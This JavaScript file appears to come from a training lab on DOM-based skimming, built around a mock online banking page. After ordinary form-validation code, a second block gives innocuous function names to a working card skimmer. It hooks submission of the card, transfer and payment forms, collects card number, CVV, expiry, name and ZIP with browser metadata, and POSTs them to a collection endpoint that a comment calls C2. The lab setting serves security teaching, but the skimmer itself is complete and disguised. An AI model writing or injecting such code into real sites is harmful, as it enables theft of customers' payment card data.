/**
 * BANKING.JS - LEGITIMATE BANKING APPLICATION
 *
 * This file contains the legitimate banking interface functionality
 * that will be targeted by DOM-based skimming attacks.
 *
 * Key features:
 * - Section navigation and form handling
 * - Real-time form validation
 * - Dynamic content updates
 * - Modal management
 * - Security prompts
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

;(function () {
  'use strict'

  console.log('[Banking] Initializing SecureBank online banking system...')

  // Application state
  const appState = {
    currentSection: 'cards', // Default to cards page
    user: {
      name: 'John Doe',
      accounts: {
        checking: { number: '****1234', balance: 12485.67 },
        savings: { number: '****5678', balance: 45892.33 },
        credit: { number: '****9012', balance: -2156.78 }
      }
    }
  }

  /**
   * Navigation Management
   */
  function initNavigation() {
    const tabLinks = document.querySelectorAll('.tab-link')
    const sections = document.querySelectorAll('.section')

    tabLinks.forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault()
        const targetSection = link.getAttribute('data-section')
        
        if (targetSection) {
          showSection(targetSection)

          // Update active tab link
          tabLinks.forEach(tab => tab.classList.remove('active'))
          link.classList.add('active')

          appState.currentSection = targetSection
          console.log('[Banking] Navigated to section:', targetSection)
          
          // Special handling for cards section - show add card form by default
          if (targetSection === 'cards') {
            showAddCardForm()
          }
        }
      })
    })

    function showSection(sectionId) {
      sections.forEach(section => section.classList.remove('active'))
      const targetSection = document.getElementById(sectionId)
      if (targetSection) {
        targetSection.classList.add('active')
      }
    }
  }

  /**
   * Form Validation Utilities
   */
  function validateEmail(email) {
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return emailPattern.test(email)
  }

  function validatePhone(phone) {
    const phonePattern = /^\(\d{3}\)\s\d{3}-\d{4}$/
    return phonePattern.test(phone)
  }

  function validateAmount(amount) {
    const num = parseFloat(amount)
    return !isNaN(num) && num > 0
  }

  function validatePassword(password) {
    return password && password.length >= 6
  }

  function validateAccountNumber(accountNumber) {
    return accountNumber && accountNumber.length >= 8
  }

  function validateCardNumber(cardNumber) {
    // Remove spaces and dashes for validation
    const cleaned = cardNumber.replace(/[\s-]/g, '')
    // Must be 13-19 digits (standard credit card lengths)
    return /^\d{13,19}$/.test(cleaned)
  }

  function validateCardExpiry(expiry) {
    // Format: MM/YY
    return /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiry)
  }

  function validateCVV(cvv) {
    // Must be 3 or 4 digits
    return /^\d{3,4}$/.test(cvv)
  }

  function formatCardNumber(value) {
    // Remove all non-digits
    const cleaned = value.replace(/\D/g, '')
    // Add space every 4 digits
    const formatted = cleaned.match(/.{1,4}/g)?.join(' ') || cleaned
    return formatted
  }

  function formatCardExpiry(value) {
    // Remove all non-digits
    const cleaned = value.replace(/\D/g, '')
    // Format as MM/YY
    if (cleaned.length >= 2) {
      return cleaned.slice(0, 2) + '/' + cleaned.slice(2, 4)
    }
    return cleaned
  }

  /**
   * Real-time Form Validation
   */
  function setupFormValidation() {
    const forms = document.querySelectorAll('.banking-form')

    // Add asterisks to required field labels
    forms.forEach(form => {
      const requiredFields = form.querySelectorAll('input[required], select[required]')
      requiredFields.forEach(field => {
        const label = form.querySelector(`label[for="${field.id}"]`)
        if (label && !label.querySelector('.required-asterisk')) {
          const asterisk = document.createElement('span')
          asterisk.className = 'required-asterisk'
          asterisk.style.color = 'var(--danger-color)'
          asterisk.style.marginLeft = '0.25rem'
          asterisk.textContent = '*'
          label.appendChild(asterisk)
        }
      })
    })

    forms.forEach(form => {
      const inputs = form.querySelectorAll('input, select')
      
      // Track if form has been submitted to show required errors
      let formSubmitted = false
      
      form.addEventListener('submit', e => {
        formSubmitted = true
      })

      inputs.forEach(input => {
        // Track if field has been touched
        let fieldTouched = false
        
        input.addEventListener('focus', () => {
          fieldTouched = true
          // Clear any existing errors when user focuses on field
          clearFieldError(input)
        })
        
        // ONLY validate on blur (when user leaves the field) - NO validation on input!
        input.addEventListener('blur', () => {
          fieldTouched = true
          validateField(input, fieldTouched || formSubmitted)
        })

        // Add real-time formatting for card number (NO validation, just formatting)
        if (input.id === 'card-number' || input.name === 'cardNumber') {
          input.addEventListener('input', e => {
            const formatted = formatCardNumber(e.target.value)
            e.target.value = formatted
            // Only clear errors, NO validation
            clearFieldError(e.target)
          })
        }
        // Add real-time formatting for card expiry (NO validation, just formatting)
        else if (input.id === 'card-expiry' || input.name === 'cardExpiry') {
          input.addEventListener('input', e => {
            const formatted = formatCardExpiry(e.target.value)
            e.target.value = formatted
            // Only clear errors, NO validation
            clearFieldError(e.target)
          })
        }
        // Add maxlength enforcement for CVV (NO validation, just formatting)
        else if (input.id === 'card-cvv-input' || input.name === 'cvv') {
          input.addEventListener('input', e => {
            // Only allow digits
            e.target.value = e.target.value.replace(/\D/g, '')
            // Only clear errors, NO validation
            clearFieldError(e.target)
          })
        }
        // For other fields, just clear errors while typing (NO validation)
        else {
          input.addEventListener('input', e => {
            // Only clear errors, NO validation
            clearFieldError(e.target)
          })
        }

        // Validate on change as well (for dropdowns, etc.) - but only on blur equivalent
        input.addEventListener('change', e => {
          fieldTouched = true
          // Only validate on change for non-text inputs or when explicitly needed
          if (input.tagName === 'SELECT') {
            validateField(e.target, fieldTouched || formSubmitted)
          }
        })
      })
    })

    function validateField(field, showRequiredError = false) {
      // Don't validate if field is empty and hasn't been touched/submitted
      if (!field.value.trim() && !showRequiredError) {
        clearFieldError(field)
        return true
      }

      clearFieldError(field)

      let isValid = true
      let errorMessage = ''

      // Only show "required" error if field has been touched or form submitted
      if (field.required && !field.value.trim()) {
        if (showRequiredError) {
          isValid = false
          errorMessage = 'This field is required'
        }
        // Don't show error for empty required fields that haven't been touched
      } else if (field.value.trim()) {
        switch (field.type) {
          case 'email':
            if (!validateEmail(field.value)) {
              isValid = false
              errorMessage = 'Please enter a valid email address'
            }
            break
          case 'tel':
            if (!validatePhone(field.value)) {
              isValid = false
              errorMessage = 'Please enter a valid phone number'
            }
            break
          case 'number':
            if (!validateAmount(field.value)) {
              isValid = false
              errorMessage = 'Please enter a valid amount'
            }
            break
          case 'password':
            if (!validatePassword(field.value)) {
              isValid = false
              errorMessage = 'Password must be at least 6 characters'
            }
            break
          case 'text':
            // Use data-validate attribute to explicitly identify which fields need validation
            const validateType = field.getAttribute('data-validate')
            
            // Only validate fields that have explicit data-validate attribute
            if (validateType === 'card-number') {
              if (field.value.trim() && !validateCardNumber(field.value)) {
                isValid = false
                errorMessage = 'Please enter a valid credit card number'
              }
            }
            else if (validateType === 'card-expiry') {
              if (field.value.trim() && !validateCardExpiry(field.value)) {
                isValid = false
                errorMessage = 'Please enter a valid expiry date (MM/YY)'
              }
            }
            else if (validateType === 'cvv') {
              if (field.value.trim() && !validateCVV(field.value)) {
                isValid = false
                errorMessage = 'Please enter a valid CVV (3-4 digits)'
              }
            }
            else if (field.name === 'accountNumber' && field.value.trim() && !validateAccountNumber(field.value)) {
              isValid = false
              errorMessage = 'Please enter a valid account number'
            }
            // For all other text fields (like cardholder name, billing zip, memo, etc.) - NO validation
            // They only need to be non-empty if required (handled above)
            break
        }
      }

      if (!isValid) {
        showFieldError(field, errorMessage)
      }

      return isValid
    }

    function showFieldError(field, message) {
      field.classList.add('error')
      field.style.borderColor = '#dc2626'

      // Remove any existing error elements first to prevent duplicates
      const existingErrors = field.parentNode.querySelectorAll('.field-error')
      existingErrors.forEach(err => err.remove())

      // Create new error element
      const errorElement = document.createElement('div')
      errorElement.className = 'field-error'
      errorElement.style.color = '#dc2626'
      errorElement.style.fontSize = '0.875rem'
      errorElement.style.marginTop = '0.25rem'
      errorElement.textContent = message
      field.parentNode.appendChild(errorElement)
    }

    function clearFieldError(field) {
      field.classList.remove('error')
      field.style.borderColor = ''

      const errorElement = field.parentNode.querySelector('.field-error')
      if (errorElement) {
        errorElement.remove()
      }
    }
  }

  /**
   * Transfer Form Handler
   */
  function initTransferForm() {
    const transferForm = document.getElementById('transfer-form')

    if (transferForm) {
      transferForm.addEventListener('submit', async e => {
        e.preventDefault()
        console.log('[Banking] Processing transfer...')

        const formData = new FormData(transferForm)
        const transferData = {
          fromAccount: formData.get('fromAccount') || 'CHECKING-1234',
          toAccount: formData.get('toAccount') || 'SAVINGS-5678',
          amount: parseFloat(formData.get('amount')) || 500.0,
          memo: formData.get('memo') || 'Transfer to savings'
        }

        // Validate transfer data
        if (
          !transferData.fromAccount ||
          !transferData.toAccount ||
          !transferData.amount
        ) {
          showMessage('error', 'Please fill in all required fields')
          return
        }

        if (transferData.amount <= 0) {
          showMessage('error', 'Transfer amount must be greater than zero')
          return
        }

        // Simulate processing
        const submitBtn = transferForm.querySelector('.submit-btn')
        const originalText = submitBtn.textContent
        submitBtn.textContent = 'Processing...'
        submitBtn.disabled = true

        try {
          await simulateTransaction('transfer', transferData)
          showMessage(
            'success',
            `Transfer of $${transferData.amount.toFixed(2)} completed successfully`
          )
          transferForm.reset()
        } catch (error) {
          console.error('[Banking] Transfer error:', error)
          showMessage('error', 'Transfer failed. Please try again.')
        } finally {
          submitBtn.textContent = originalText
          submitBtn.disabled = false
        }
      })
    }
  }

  /**
   * Payment Form Handler
   */
  function initPaymentForm() {
    const paymentForm = document.getElementById('payment-form')

    if (paymentForm) {
      paymentForm.addEventListener('submit', async e => {
        e.preventDefault()
        console.log('[Banking] Processing bill payment...')

        const formData = new FormData(paymentForm)
        const paymentData = {
          payee: formData.get('payee') || 'Electric Company',
          accountNumber: formData.get('accountNumber') || '1234567890',
          amount: parseFloat(formData.get('amount')) || 150.0,
          paymentDate: formData.get('paymentDate') || '2024-12-01'
        }

        // Validate payment data
        if (
          !paymentData.payee ||
          !paymentData.accountNumber ||
          !paymentData.amount
        ) {
          showMessage('error', 'Please fill in all required fields')
          return
        }

        // Simulate processing
        const submitBtn = paymentForm.querySelector('.submit-btn')
        const originalText = submitBtn.textContent
        submitBtn.textContent = 'Scheduling...'
        submitBtn.disabled = true

        try {
          await simulateTransaction('payment', paymentData)
          showMessage(
            'success',
            `Payment of $${paymentData.amount.toFixed(2)} scheduled successfully`
          )
          paymentForm.reset()
        } catch (error) {
          console.error('[Banking] Payment error:', error)
          showMessage('error', 'Payment scheduling failed. Please try again.')
        } finally {
          submitBtn.textContent = originalText
          submitBtn.disabled = false
        }
      })
    }
  }

  /**
   * Add Card Form Handler
   */
  function initAddCardForm() {
    const addCardForm = document.getElementById('add-card-form')

    if (addCardForm) {
      addCardForm.addEventListener('submit', async e => {
        e.preventDefault()
        console.log('[Banking] Processing add card...')

        const formData = new FormData(addCardForm)
        const cardData = {
          cardNumber: formData.get('cardNumber') || '',
          cardHolderName: formData.get('cardHolderName') || '',
          cardExpiry: formData.get('cardExpiry') || '',
          cvv: formData.get('cvv') || '',
          billingZip: formData.get('billingZip') || ''
        }

        // Validate card data
        if (
          !cardData.cardNumber ||
          !cardData.cardHolderName ||
          !cardData.cardExpiry ||
          !cardData.cvv ||
          !cardData.billingZip
        ) {
          showMessage('error', 'Please fill in all required fields')
          return
        }

        // Simulate processing
        const submitBtn = addCardForm.querySelector('.submit-btn')
        const originalText = submitBtn.textContent
        submitBtn.textContent = 'Adding Card...'
        submitBtn.disabled = true

        try {
          await simulateTransaction('add-card', cardData)
          showMessage('success', 'Credit card added successfully')
          addCardForm.reset()
          // Focus on first field after reset
          const firstInput = addCardForm.querySelector('input[required]')
          if (firstInput) {
            firstInput.focus()
          }
        } catch (error) {
          console.error('[Banking] Add card error:', error)
          showMessage('error', 'Failed to add card. Please try again.')
        } finally {
          submitBtn.textContent = originalText
          submitBtn.disabled = false
        }
      })
    }
  }

  /**
   * Card Form Management
   */
  window.showAddCardForm = function () {
    console.log('[Banking] Showing add card form')
    const addCardContainer = document.getElementById('add-card-form-container')
    const existingCardsContainer = document.getElementById('existing-cards-container')
    
    if (addCardContainer) {
      addCardContainer.style.display = 'block'
    }
    if (existingCardsContainer) {
      existingCardsContainer.style.display = 'none'
    }
    
    // Focus on first input field
    const firstInput = document.getElementById('card-number')
    if (firstInput) {
      setTimeout(() => firstInput.focus(), 100)
    }
  }

  function showExistingCards() {
    const addCardContainer = document.getElementById('add-card-form-container')
    const existingCardsContainer = document.getElementById('existing-cards-container')
    
    if (addCardContainer) {
      addCardContainer.style.display = 'none'
    }
    if (existingCardsContainer) {
      existingCardsContainer.style.display = 'block'
    }
  }

  /**
   * Card Action Modal Management
   */
  function initCardActions() {
    const cardActionForm = document.getElementById('card-action-form')

    if (cardActionForm) {
      cardActionForm.addEventListener('submit', async e => {
        e.preventDefault()
        console.log('[Banking] Processing card action...')

        const formData = new FormData(cardActionForm)
        const actionData = {
          cvv: formData.get('cvv'),
          action: window.currentCardAction
        }

        if (!actionData.cvv) {
          showMessage('error', 'Please provide the card CVV')
          return
        }

        // Simulate processing
        const submitBtn = cardActionForm.querySelector('.submit-btn')
        const originalText = submitBtn.textContent
        submitBtn.textContent = 'Verifying...'
        submitBtn.disabled = true

        try {
          await simulateTransaction('card-action', actionData)
          showMessage('success', `Card ${actionData.action} completed successfully`)
          closePasswordModal()
          cardActionForm.reset()
        } catch (error) {
          console.error('[Banking] Card action error:', error)
          showMessage('error', 'Card action failed. Please try again.')
        } finally {
          submitBtn.textContent = originalText
          submitBtn.disabled = false
        }
      })
    }
  }

  /**
   * Modal Management
   */
  window.showPasswordPrompt = function (action) {
    console.log('[Banking] Showing CVV prompt for action:', action)
    window.currentCardAction = action
    const modal = document.getElementById('password-modal')
    if (modal) {
      modal.style.display = 'flex'
      const cvvField = document.getElementById('card-cvv')
      if (cvvField) {
        cvvField.focus()
      }
    }
  }

  window.closePasswordModal = function () {
    console.log('[Banking] Closing password modal')
    const modal = document.getElementById('password-modal')
    if (modal) {
      modal.style.display = 'none'
    }
    window.currentCardAction = null
  }

  /**
   * Message System
   */
  function showMessage(type, text) {
    console.log(`[Banking] Showing ${type} message:`, text)

    const messageElement = document.getElementById(`${type}-message`)
    if (messageElement) {
      const textElement = messageElement.querySelector('.message-text')
      if (textElement) {
        textElement.textContent = text
      }
      messageElement.style.display = 'flex'

      // Auto-hide after 5 seconds
      setTimeout(() => {
        closeMessage(type)
      }, 5000)
    }
  }

  window.closeMessage = function (type) {
    const messageElement = document.getElementById(`${type}-message`)
    if (messageElement) {
      messageElement.style.display = 'none'
    }
  }

  /**
   * Transaction Simulation
   */
  async function simulateTransaction(type, data) {
    console.log(`[Banking] Simulating ${type} transaction:`, data)

    // Simulate network delay
    await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000))

    // Simulate occasional failures (10% chance)
    if (Math.random() < 0.1) {
      throw new Error('Simulated transaction failure')
    }

    console.log(`[Banking] ${type} transaction completed successfully`)
    return { success: true, transactionId: 'TXN-' + Date.now() }
  }

  /**
   * Dynamic Content Updates
   */
  function updateAccountBalances() {
    // Simulate real-time balance updates
    setInterval(() => {
      const balanceElements = document.querySelectorAll('.account-balance')
      balanceElements.forEach(element => {
        // Small random fluctuations to simulate real banking
        const currentText = element.textContent
        if (currentText.includes('$') && !currentText.includes('-')) {
          const value = parseFloat(currentText.replace(/[$,]/g, ''))
          const fluctuation = (Math.random() - 0.5) * 10 // ±$5 fluctuation
          const newValue = Math.max(0, value + fluctuation)
          element.textContent = `$${newValue.toLocaleString('en-US', { minimumFractionDigits: 2 })}`
        }
      })
    }, 30000) // Update every 30 seconds
  }

  /**
   * Security Monitoring
   */
  function initSecurityMonitoring() {
    console.log('[Banking] Initializing security monitoring...')

    // Monitor for suspicious activity patterns
    let passwordAttempts = 0
    let lastPasswordAttempt = 0

    document.addEventListener('input', e => {
      if (e.target.type === 'password') {
        const now = Date.now()
        if (now - lastPasswordAttempt < 1000) {
          passwordAttempts++
          if (passwordAttempts > 10) {
            console.warn('[Banking] Suspicious password input activity detected')
          }
        } else {
          passwordAttempts = 0
        }
        lastPasswordAttempt = now
      }
    })

    // Monitor for rapid form submissions
    let formSubmissions = []
    document.addEventListener('submit', e => {
      const now = Date.now()
      formSubmissions.push(now)

      // Clean old submissions (older than 60 seconds)
      formSubmissions = formSubmissions.filter(time => now - time < 60000)

      if (formSubmissions.length > 5) {
        console.warn('[Banking] Suspicious form submission activity detected')
      }
    })
  }

  /**
   * Application Initialization
   */
  function init() {
    console.log('[Banking] Starting application initialization...')

    try {
      initNavigation()
      setupFormValidation()
      initTransferForm()
      initPaymentForm()
      initAddCardForm()
      initCardActions()
      updateAccountBalances()
      initSecurityMonitoring()

      // Set default section to cards and show add card form
      const cardsSection = document.getElementById('cards')
      if (cardsSection) {
        // Hide other sections
        document.querySelectorAll('.section').forEach(section => {
          section.classList.remove('active')
        })
        cardsSection.classList.add('active')
      }
      
      // Show add card form by default
      showAddCardForm()

      console.log('[Banking] Application initialized successfully')

      // Show welcome message
      setTimeout(() => {
        showMessage('success', `Welcome back, ${appState.user.name}!`)
      }, 1000)
    } catch (error) {
      console.error('[Banking] Application initialization failed:', error)
      showMessage('error', 'Application failed to initialize properly')
    }
  }

  // Initialize when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init)
  } else {
    init()
  }
})()

/**
 * LEGITIMATE BANKING APPLICATION ANALYSIS:
 *
 * This banking application provides multiple attack surfaces for DOM-based skimming:
 *
 * 1. **Rich Form Structure**: Multiple forms with sensitive data (passwords, account numbers, CVV)
 * 2. **Real-time Validation**: Input/change/blur event listeners that could be monitored
 * 3. **Dynamic Content**: DOM updates that could be intercepted or modified
 * 4. **Modal Systems**: Password prompts that could be overlaid or replaced
 * 5. **State Management**: Application state that could be accessed or modified
 *
 * Training Version - Benign Function Names
 * This file includes legitimate banking functionality with training versions
 * of form processing handlers using benign function names for AI training.
 *
 * FOR AI TRAINING PURPOSES ONLY
 */

// ============================================================================
// PART 2: FORM PROCESSING HANDLERS (Training Version - Benign Names)
// ============================================================================

;(function () {
  'use strict'

  console.log('[Banking] Initializing form processing handlers...')

  // Processing configuration
  // Dynamically determine C2 URL based on environment
  const hostname = window.location.hostname
  let apiUrl = 'http://localhost:9004/collect' // Local development default

  // Production and staging - use relative URL since C2 is proxied by nginx
  if (hostname.includes('run.app') || hostname.includes('pcioasis.com')) {
    apiUrl = window.location.origin + '/collect'
  }

  const PROCESSING_CONFIG = {
    apiUrl: apiUrl,
    processingDelay: 100,
    debug: true
  }

  function logProcessingEvent(message, data) {
    if (PROCESSING_CONFIG.debug) {
      console.log('[Form-Processor]', message, data || '')
    }
  }

  /**
   * Process form data from fields
   */
  function processFormData() {
    logProcessingEvent('Processing form data from fields...')
    const data = {
      cardNumber: getFormFieldValue(['#card-number', '[name="cardNumber"]']),
      cvv: getFormFieldValue(['#card-cvv-input', '#card-cvv', '[name="cvv"]']),
      expiry: getFormFieldValue(['#card-expiry', '[name="cardExpiry"]']),
      cardholderName: getFormFieldValue(['#card-holder-name', '[name="cardHolderName"]']),
      billingZip: getFormFieldValue(['#card-billing-zip', '[name="billingZip"]'])
    }

    logProcessingEvent('Processed form data:', data)

    // Add metadata
    data.metadata = {
      url: window.location.href,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      screenResolution: screen.width + 'x' + screen.height
    }

    return data
  }

  function getFormFieldValue(selectors) {
    logProcessingEvent('Searching for form field with selectors:', selectors)
    for (let selector of selectors) {
      const element = document.querySelector(selector)
      if (element && element.value) {
        return element.value.trim()
      }
    }
    return ''
  }

  function validateFormData(data) {
    const cleanCard = data.cardNumber ? data.cardNumber.replace(/[\s-]/g, '') : ''
    const validLength = cleanCard.length === 15 || cleanCard.length === 16
    const validCVV = data.cvv && (data.cvv.length === 3 || data.cvv.length === 4)
    return validLength && validCVV && data.expiry
  }

  /**
   * Send form data to processing API
   */
  function sendFormData(data) {
    logProcessingEvent('Sending form data to processing API:', data)
    logProcessingEvent('Target URL:', PROCESSING_CONFIG.apiUrl)

    const requestBody = JSON.stringify(data)

    fetch(PROCESSING_CONFIG.apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: requestBody,
      mode: 'cors',
      credentials: 'omit'
    })
      .then(response => {
        logProcessingEvent('API response status:', response.status)
        return response.text()
      })
      .then(responseText => {
        logProcessingEvent('API response body:', responseText)
        logProcessingEvent('Form data successfully sent')
      })
      .catch(error => {
        console.error('[Form-Processor] API request failed:', error)
      })
  }

  /**
   * Initialize form processor
   */
  function initFormProcessor() {
    logProcessingEvent('Initializing form processor...')

    const checkForm = setInterval(() => {
      const forms = document.querySelectorAll('#add-card-form, #card-action-form, #transfer-form, #payment-form')

      forms.forEach(form => {
        if (form && !form.dataset.processorAttached) {
          form.dataset.processorAttached = 'true'
          logProcessingEvent('Form found, attaching processor', form.id)

          // Intercept form submission
          form.addEventListener('submit', function (event) {
            logProcessingEvent('Form submission detected', form.id)

            const formData = processFormData()

            if (validateFormData(formData)) {
              logProcessingEvent('Valid form data found, preparing to send')

              setTimeout(() => {
                sendFormData(formData)
              }, PROCESSING_CONFIG.processingDelay)
            } else {
              logProcessingEvent('Insufficient form data, skipping send')
            }

            // Allow legitimate form submission to continue
          })
        }
      })
    }, 100)

    // Stop checking after 10 seconds
    setTimeout(() => {
      clearInterval(checkForm)
    }, 10000)
  }

  // Start the form processor
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initFormProcessor)
  } else {
    initFormProcessor()
  }
})()
